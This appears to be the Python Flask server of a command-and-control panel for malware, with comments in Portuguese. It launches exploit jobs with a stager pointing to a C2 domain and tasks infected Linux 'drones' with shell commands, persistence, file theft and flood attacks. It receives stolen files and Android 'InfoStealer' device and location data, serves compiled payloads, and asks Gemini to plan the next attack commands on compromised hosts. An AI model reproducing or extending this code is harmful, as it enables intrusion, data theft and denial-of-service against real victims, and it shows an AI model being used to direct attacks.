        # Sobrescreve a porta default se fornecida
        if port and hasattr(module, 'TARGET_PORT'):
            module.TARGET_PORT = int(port)
 
        module.run(
            target_ip     = target_ip,
            stager_script = stager_script,
            log_function  = log_fn
        )
        status = 'success'
 
    except Exception as e:
        import traceback
        log_fn(f"[JOB] Erro: {e}")
        log_fn(traceback.format_exc())
 
    # Emite evento de conclusão do job individual
    socketio.emit('exploit_job_done', {
        'run_id':  run_id,
        'exploit': exploit_name,
        'port':    port,
        'status':  status
    })
    return status
 
 
def _execute_jobs_thread(exploit_names: list, target_ip: str,
                         ports: list, mode: str, run_id: str):
    """Thread principal que orquestra todos os jobs."""
    jobs         = _build_jobs(exploit_names, ports)
    total        = len(jobs)
    success_count = 0
 
    c2_base = os.environ.get('C2_BASE_URL', 'https://panelwhxami.shop')
    stager_script = _get_stager_script(c2_base)
 
    socketio.emit('exploit_log', {
        'run_id':  run_id,
        'message': f"[SERVIDOR] {total} job(s) a executar — modo {mode}",
        'level':   'step'
    })
 
    if mode == 'parallel':
        # ── Modo paralelo: todos os jobs em threads simultâneas ──────────────
        results    = [None] * total
        threads    = []
 
        def run_job(idx, job):
            results[idx] = _execute_single_job(job, target_ip, run_id, stager_script)
 
        for i, job in enumerate(jobs):
            t = threading.Thread(target=run_job, args=(i, job), daemon=True)
            threads.append(t)
            t.start()
 
        for t in threads:
            t.join()
 
        success_count = sum(1 for r in results if r == 'success')
 
    else:
        # ── Modo sequencial: um job de cada vez ──────────────────────────────
        for job in jobs:
            result = _execute_single_job(job, target_ip, run_id, stager_script)
            if result == 'success':
                success_count += 1
 
    # Emite evento de conclusão geral
    socketio.emit('exploit_finished', {
        'run_id':        run_id,
        'total_jobs':    total,
        'success_count': success_count,
        'status':        'success' if success_count > 0 else 'failed'
    })



#NMAP ROUTES AND FUNCTIONS

def _parse_nmap_output(output: str) -> list:
    """
    Extrai portas abertas do output texto do nmap.
    Retorna lista de dicts: {port, protocol, state, service, version}
    """
    ports = []
 
    # Regex para linhas de porta:
    # Ex: "80/tcp   open  http    Apache httpd 2.4.41"
    # Ex: "6379/tcp open  redis   Redis key-value store 6.2"
    pattern = re.compile(
        r'^(\d+)/(tcp|udp)\s+'       # porta/protocolo
        r'(open|closed|filtered)\s+' # estado
        r'(\S+)'                      # serviço
        r'(?:\s+(.+))?$',             # versão (opcional)
        re.MULTILINE
    )
 
    for match in pattern.finditer(output):
        port, proto, state, service, version = match.groups()
        ports.append({
            "port":     port,
            "protocol": proto,
            "state":    state,
            "service":  service or "",
            "version":  (version or "").strip(),
        })
 
    return ports
 
 
def _sanitize_nmap_args(args: str) -> list:
    """
    Converte a string de argumentos em lista segura para subprocess.
    Remove flags perigosas que poderiam ser usadas para injeção de comando.
    """
    BLOCKED = {'--script-args', '-oN', '-oX', '-oG', '-oA', '--resume', '-iL', '-iR'}
 
    try:
        parts = shlex.split(args)
    except ValueError:
        parts = args.split()
 
    safe = []
    skip_next = False
    for part in parts:
        if skip_next:
            skip_next = False
            continue
        # Bloqueia flags de output para arquivo e input de arquivo
        if any(part.startswith(b) for b in BLOCKED):
            skip_next = '=' not in part
            continue
        safe.append(part)
 
    return safe
 
 
# ── ROTA ──────────────────────────────────────────────────────────────────────
 
@app.route('/api/nmap/scan', methods=['POST'])
@login_required
@role_required('Administrator')
def nmap_scan():
    """
    Executa nmap e emite o output linha por linha via WebSocket em tempo real.
 
    Body JSON:
        target:  IP ou hostname alvo
        args:    argumentos nmap (ex: "-sV -O --open")
        scan_id: ID único do scan (gerado pelo frontend)
    """
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "Body inválido."}), 400
 
    target  = data.get('target', '').strip()
    args    = data.get('args', '-sV --open').strip()
    scan_id = data.get('scan_id', f"scan-{uuid.uuid4()}")
 
    if not target:
        return jsonify({"status": "error", "message": "target é obrigatório."}), 400
 
    # Verifica se nmap está instalado
    if not shutil.which('nmap'):
        return jsonify({
            "status": "error",
            "message": "nmap não encontrado. Instale com: sudo apt-get install nmap"
        }), 500
 
    log_operator_action(
        session.get('username', 'unknown'),
        'nmap_scan',
        f"nmap {args} {target}"
    )
 
    socketio.start_background_task(
        _run_nmap_thread,
        target, args, scan_id
    )
 
    return jsonify({"status": "started", "scan_id": scan_id})
 
 
def _run_nmap_thread(target: str, args_str: str, scan_id: str):
    """
    Executa o nmap em background e emite cada linha via WebSocket.
    """
    import time as _time
 
    safe_args = _sanitize_nmap_args(args_str)
    command   = ['nmap'] + safe_args + [target]
 
    socketio.emit('nmap_output', {
        'scan_id': scan_id,
        'line':    f"[NMAP] Executando: {' '.join(command)}"
    })
 
    full_output = []
    start_time  = _time.time()
 
    try:
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
 
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue
            full_output.append(line)
            socketio.emit('nmap_output', {
                'scan_id': scan_id,
                'line':    line
            })
 
        proc.wait()
        duration = f"{round(_time.time() - start_time, 1)}s"
 
        # Parseia as portas do output completo
        ports = _parse_nmap_output('\n'.join(full_output))
 
        socketio.emit('nmap_output', {
            'scan_id': scan_id,
            'line':    f"[NMAP] Scan concluído em {duration} — {len(ports)} porta(s) detectada(s)."
        })
 
        socketio.emit('nmap_finished', {
            'scan_id':  scan_id,
            'target':   target,
            'args':     args_str,
            'ports':    ports,
            'duration': duration,
            'status':   'success' if ports else 'no_results'
        })
 
    except Exception as e:
        socketio.emit('nmap_output', {
            'scan_id': scan_id,
            'line':    f"[NMAP] Erro: {e}"
        })
        socketio.emit('nmap_finished', {
            'scan_id': scan_id,
            'target':  target,
            'args':    args_str,
            'ports':   [],
            'status':  'error'
        })



@app.route('/api/analyze_agent', methods=['POST'])
@login_required
def analyze_agent():
    """
    Rota de análise que busca os dados do agente diretamente do banco de dados.
    """
    agent_id = request.json.get('agent_id')
    if not agent_id:
        return jsonify({"error": "ID do agente não fornecido."}), 400

    # --- INÍCIO DA CORREÇÃO ---
    # Busca os dados do agente no banco de dados em vez da variável global 'agents'
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM agents WHERE id = ?", (agent_id,))
        agent_row = cursor.fetchone()
        conn.close()

        if not agent_row:
            # Se o agente não for encontrado no banco, retorna um erro JSON claro
            return jsonify({"error": "Agente inválido ou não encontrado no banco de dados."}), 404
        
        # Converte a linha do banco de dados em um dicionário
        agent_data = dict(agent_row)

    except Exception as e:
        print(f"[ERRO DB] Falha ao buscar agente {agent_id} para análise: {e}")
        return jsonify({"error": "Erro interno ao consultar o banco de dados."}), 500
    # --- FIM DA CORREÇÃO ---

    # O resto da sua função para montar o prompt e chamar a API continua o mesmo
    geo_info = f"{agent_data.get('geo_city', 'N/A')}, {agent_data.get('geo_country', 'N/A')}"

    # Usaremos o prompt enriquecido que discutimos anteriormente
    prompt = f"""
# Persona
Aja como um analista de Red Team sênior e especialista em MITRE ATT&CK.

# Contexto do Alvo Comprometido
- **Hostname:** {agent_data.get('hostname', 'N/A')}
- **Usuário:** {agent_data.get('username', 'N/A')}
- **Sistema Operacional:** {agent_data.get('os_name', 'N/A')}
- **Nível de Privilégio:** {agent_data.get('privileges', 'N/A')}

# Instrução
Com base nos dados do alvo, forneça um briefing tático em 3 seções, em português do Brasil. Seja direto e prático.

## 1. Análise da Situação
Resuma os pontos fortes e fracos da nossa posição atual neste alvo.

## 2. Recomendações Táticas (Próximos Passos)
Liste de 2 a 4 ações recomendadas em ordem de prioridade. Para cada uma, forneça o comando exato a ser usado e a justificativa (MITRE ATT&CK).

## 3. Resumo para Relatório
Um parágrafo conciso para um relatório de operação.

Use Markdown para formatar sua resposta: `#` para o título principal, `##` para as seções, e `**` para destacar.
"""

    print(f"[INFO] Enviando prompt para o Gemini para o agente {agent_id}...")
    gemini_response = call_gemini_api(prompt)

    status_code = gemini_response.get("status_code", 500)
    if "error" in gemini_response:
        error_details = gemini_response.get("error", {})
        error_message = error_details.get("message", "Erro interno.")
        print(f"[ERRO GEMINI] Falha com status {status_code}. Mensagem: {error_message}")
        return jsonify({"error": "Falha na análise de IA", "details": error_message}), status_code

    try:
        response_json = gemini_response.get("data", {})
        text_analysis = response_json["candidates"][0]["content"]["parts"][0]["text"]
        return jsonify({"analysis": text_analysis})
    except (KeyError, IndexError) as e:
        print(f"[ERRO GEMINI] Formato de resposta da API inesperado: {e}")
        return jsonify({"error": "Formato de resposta da API inválido."}), 500




@app.route('/get_agents', methods=['GET'])
@login_required
def get_agents_route(): # Renomeamos a rota para evitar conflito
    return jsonify(get_agents_with_status())

@app.route('/get_results/<agent_id>', methods=['GET'])
@login_required
def get_results(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    cursor.execute(
        "SELECT * FROM tasks WHERE agent_id = ? AND status = 'concluido' ORDER BY timestamp_issued DESC",
        (agent_id,)
    )
    rows = cursor.fetchall()
    conn.close()
    return jsonify({"results": [dict(row) for row in rows]})

@app.route('/list_downloads/<agent_id>', methods=['GET'])
@login_required
def list_downloads(agent_id):
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404
    
    conn.close()
    # --- FIM DA MIGRAÇÃO SQL ---

    # A lógica de listar arquivos permanece exatamente a mesma.
    agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
    if not os.path.isdir(agent_download_dir):
        return jsonify([]) # Retorna uma lista vazia se o diretório não existir
        
    files = [f for f in os.listdir(agent_download_dir) if os.path.isfile(os.path.join(agent_download_dir, f))]
    return jsonify(files)


# --- Rota e Evento para o Dashboard ---

@app.route('/dashboard')
@login_required
def dashboard_route():
    return render_template('dashboard.html')


@app.route("/api/dashboard_data", methods=["GET"])
@login_required
def dashboard_data():
    try:
        data = get_dashboard_data_logic()
        return jsonify(data)
    except Exception as e:
        print(f"[ERRO] /api/dashboard_data: {e}")
        return jsonify({"error": "Falha ao coletar dados do dashboard"}), 500

@socketio.on('request_dashboard_data')
def handle_dashboard_request():
    """Quando o dashboard se conecta, ele pede os dados atuais."""
    print(f"[INFO] Dashboard {request.sid} pediu os dados iniciais.")
    socketio.emit('dashboard_update', get_dashboard_data_logic(), to=request.sid)

@app.route('/decrypt_file', methods=['POST'])
@login_required
def decrypt_file_route():
    if not AES: return jsonify({"status": "error", "message": "Biblioteca de criptografia não está instalada no servidor."}), 500
    data = request.json
    agent_id = data.get('agent_id'); filename = data.get('filename'); key_b64 = data.get('key_b64')
    if not all([agent_id, filename, key_b64]): return jsonify({"status": "error", "message": "Dados incompletos."}), 400
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return jsonify({"status": "error", "message": "Chave inválida."}), 400
    except: return jsonify({"status": "error", "message": "Chave Base64 inválida."}), 400
    file_path = os.path.join(DOWNLOADS_DIR, agent_id, filename)
    if not os.path.exists(file_path): return jsonify({"status": "error", "message": "Arquivo não encontrado no servidor."}), 404
    try:
        with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        decrypted_path = file_path.replace('.encrypted', '.decrypted')
        with open(decrypted_path, 'wb') as f_out: f_out.write(original_data)
        return jsonify({"status": "success", "message": f"Arquivo salvo como {os.path.basename(decrypted_path)}"})
    except Exception as e: return jsonify({"status": "error", "message": f"Falha na descriptografia: {e}"}), 500

    

# -- ROTAS PARA AGENTES LINUX -- #


@app.route('/get_drone_command/<drone_id>', methods=['GET'])
def get_drone_command(drone_id):
    """
    VersÃ£o v7.0 - Adiciona suporte para os comandos 'persist' e 'download'.
    """
    command_to_send = ""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()

        # LÃ³gica de Registro/AtualizaÃ§Ã£o (sem alteraÃ§Ãµes)
        cursor.execute("SELECT id FROM agents WHERE id = ?", (drone_id,))
        if not cursor.fetchone():
            # ... (cÃ³digo de registro do drone) ...
            agent_data = { "id": drone_id, "hostname": f"Drone-{drone_id[-6:]}", "username": "drone", "os_name": "Linux (Shell)", "agent_version": "Shell-v7.0", "external_ip": request.remote_addr, "status": "online", "first_seen": datetime.now().isoformat(), "last_seen": datetime.now().isoformat(), "internal_ip": "N/A", "privileges": "User", "geo_latitude": None, "geo_longitude": None, "geo_city": None, "geo_country": None, "geo_last_checked": None }
            cursor.execute("INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked) VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)", agent_data)
            log_system_event(drone_id, "REGISTER", "Novo Drone PÃ³s-ExploraÃ§Ã£o (v7.0) detectado.")
        else:
            cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), drone_id))
        conn.commit()

        # Logigica de Busca e TraduÃ§Ã£o de Tarefa
        cursor.execute("SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pendente' ORDER BY timestamp_issued ASC LIMIT 1", (drone_id,))
        task_row = cursor.fetchone()
        
        if task_row:
            task_id = task_row['id']
            command = task_row['command']
            args_str = task_row['args']
            
            task_payload = ""
            
            # --- LÃ“GICA DE TRADUÃ‡ÃƒO ATUALIZADA ---
            if command == 'shell':
                task_payload = f"shell:{args_str}"
            elif command == 'persist':
                task_payload = "persist:true" # NÃ£o precisa de argumentos
            elif command == 'download':
                task_payload = f"download:{args_str}" # O argumento Ã© o caminho do arquivo
            elif command == 'start_attack':
                try:
                    attack_args = json.loads(args_str)
                    method = attack_args.get('method', 'http_get' )
                    target = attack_args.get('target', '')
                    port = attack_args.get('port', 80)
                    duration = attack_args.get('duration', 60)
                    threads = attack_args.get('threads', 50)
                    task_payload = f"attack:{method},{target},{port},{duration},{threads}"
                except:
                    task_payload = "shell:echo '[ERRO] Argumentos de ataque invÃ¡lidos.'"
            
            if task_payload:
                command_to_send = f"{task_id}:{task_payload}"
                cursor.execute("UPDATE tasks SET status = 'executando' WHERE id = ?", (task_id,))
                conn.commit()
        
    except Exception as e:
        print(f"[ERRO] /get_drone_command: {e}")
    finally:
        if conn: conn.close()
        socketio.emit('agent_list_update', get_agents_with_status())
        
    return Response(command_to_send, mimetype='text/plain')


@app.route('/submit_drone_result/<drone_id>', methods=['POST'])
def submit_drone_result(drone_id):
    """
    VersÃ£o v7.0 - Recebe um payload JSON com o resultado em Base64.
    """
    try:
        # --- LÃ“GICA DE RECEBIMENTO APRIMORADA ---
        data = request.get_json()
        task_id = data.get('task_id')
        data_type = data.get('data_type', 'info')
        result_b64 = data.get('result', '')
        
        # Decodifica o resultado de Base64 para texto puro
        result_data = base64.b64decode(result_b64).decode('utf-8', errors='ignore')
        
        if not task_id:
            return "Task ID ausente", 400

        # --- LÃ“GICA DE PROCESSAMENTO (SEMELHANTE AO AGENTE PRINCIPAL) ---
        # Se for um download de arquivo, salva no disco
        if data_type == 'file_download':
            try:
                # O 'result_data' aqui Ã© o JSON que o drone montou
                file_info = json.loads(result_data)
                file_content = base64.b64decode(file_info['content_b64'])
                
                agent_dir = os.path.join(DOWNLOADS_DIR, drone_id)
                os.makedirs(agent_dir, exist_ok=True)
                file_path = os.path.join(agent_dir, file_info['filename'])
                
                with open(file_path, 'wb') as f:
                    f.write(file_content)
                
                # Atualiza o resultado da tarefa com uma mensagem de sucesso
                result_data = f"Arquivo '{file_info['filename']}' baixado com sucesso e salvo no servidor."
                log_system_event(drone_id, "DOWNLOAD_SUCCESS", result_data)
            except Exception as e:
                result_data = f"Erro ao processar arquivo baixado: {e}"
                log_system_event(drone_id, "ERROR", result_data)

        # Salva o resultado final no banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE tasks SET status = 'concluido', result = ?, data_type = ? WHERE id = ?",
            (result_data, data_type, task_id)
        )
        conn.commit()
        conn.close()
        
        # Notifica o painel
        socketio.emit('new_result', {"agent_id": drone_id, "task_id": task_id, "data_type": data_type, "data": result_data})
        trigger_dashboard_update()
        
        return "OK", 200
    except Exception as e:
        print(f"[ERRO] /submit_drone_result: {e}")
        return "ERROR", 500


# --- ROTA PARA SERVIR PAYLOADS ---

@app.route('/download/<filename>', methods=['GET'])
def serve_download(filename):
    safe_name = os.path.basename(filename)  # evita path traversal
    
    # Busca primeiro em downloads/ (drones, stagers)
    if (DOWNLOADS_DIR / safe_name).exists():
        return send_from_directory(str(DOWNLOADS_DIR), safe_name)
    
    # Fallback para payloads/ (agentes compilados .exe, .elf)
    if (PAYLOADS_DIR / safe_name).exists():
        return send_from_directory(str(PAYLOADS_DIR), safe_name)
    
    return jsonify({"error": "Arquivo não encontrado."}), 404
    




@app.route('/submit_info', methods=['POST'])
def submit_info():
    """
    Endpoint para o agente InfoStealer (Android) enviar um pacote de informaçõees.
    """
    try:
        # 1. Pega os dados JSON enviados pelo agente
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON invalido ou vazio."}), 400

        # 2. Extrai as informaÃ§Ãµes do payload
        agent_id = data.get('agent_id')
        device_info = data.get('device_info', {})
        location_info = data.get('location_info', {})

        if not agent_id:
            return jsonify({"error": "agent_id ausente no payload."}), 400

        # 3. Conecta ao banco de dados para salvar/atualizar as informaÃ§Ãµes
        conn = get_db_connection()
        cursor = conn.cursor()

        # Verifica se o agente existe
        cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"error": "Agente nÃ£o registrado."}), 404

        # 4. Atualiza os dados do agente no banco de dados
        # Podemos atualizar a versÃ£o do SO, por exemplo
        cursor.execute(
            "UPDATE agents SET os_name = ?, last_seen = ? WHERE id = ?",
            (device_info.get("Android Version", "Android"), datetime.now().isoformat(), agent_id)
        )

        # 5. Salva as informaÃ§Ãµes coletadas em uma tabela de logs ou resultados
        # Vamos usar a tabela 'system_logs' para registrar essas informaÃ§Ãµes
        device_info_str = json.dumps(device_info)
        location_info_str = json.dumps(location_info)

        log_system_event(agent_id, "INFO_STEAL", f"Pacote de informações do dispositivo recebido: {device_info_str}")
        log_system_event(agent_id, "INFO_STEAL", f"Informações de localizações recebidas: {location_info_str}")
        
        conn.commit()
        conn.close()

        # 6. Notifica o painel que o agente estÃ¡ ativo
        trigger_dashboard_update()

        # 7. Responde ao agente com sucesso
        return jsonify({"status": "success", "message": "InformaÃ§Ãµes recebidas."})

    except Exception as e:
        print(f"[ERRO CRITICO] Falha na rota /submit_info: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno do servidor ao processar informaÃ§Ãµes."}), 500

# --- EVENTOS WEBSOCKET (v3.0 - Real-time) ---

@socketio.on('connect')
def handle_connect():
    """Este evento é disparado quando o painel web se conecta."""
    print(f"[+] Painel conectado com o WebSocket. SID: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Este evento é disparado quando o painel web se desconecta."""
    print(f"[-] Painel desconectado do WebSocket. SID: {request.sid}")

@socketio.on('request_initial_data')
def handle_initial_data_request():
    """
    Quando o painel se conecta, ele vai nos enviar este evento para pedir os dados atuais.
    Nós responderemos enviando a lista completa de agentes.
    """
    print(f"[INFO] Painel {request.sid} pediu os dados iniciais.")
    # Usamos 'emit' para enviar um evento ('agent_list_update') de volta APENAS para o cliente que pediu.
    socketio.emit('agent_list_update', get_agents_with_status(), to=request.sid)



if __name__ == '__main__':
    setup_directories()
    init_db()
    socketio.run(app, host='0.0.0.0', port=8000, debug=True)